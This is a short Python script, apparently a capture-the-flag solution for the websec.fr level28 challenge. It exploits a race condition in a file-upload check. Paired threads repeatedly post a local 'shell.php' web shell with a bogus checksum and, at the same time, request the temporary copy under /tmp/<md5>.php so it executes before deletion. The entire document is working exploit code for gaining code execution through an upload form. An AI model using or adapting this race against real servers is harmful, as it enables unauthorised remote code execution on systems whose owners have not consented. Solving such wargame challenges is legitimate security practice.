from weakref import proxy
import requests
from threading import Thread

TARGET = "https://websec.fr/level28"

id_md5 = "Place your md5 ip's hash here"

def uploadShell():
    requests.post(TARGET + "/index.php", data={"checksum": "blabla", "submit":"Upload and check"}, files={"flag_file": open("shell.php","r")})

def accessShell():
    r = requests.get(TARGET + f"/tmp/{id_md5}.php")
    if r.status_code != 404:  
        print(r.text)
        exit(1)
    else: print("Not found")
def main():
    for _ in range(10):
        th1 = Thread(target=uploadShell)
        th2 = Thread(target=accessShell)
        th1.start()
        th2.start()
if __name__ == '__main__':
    main()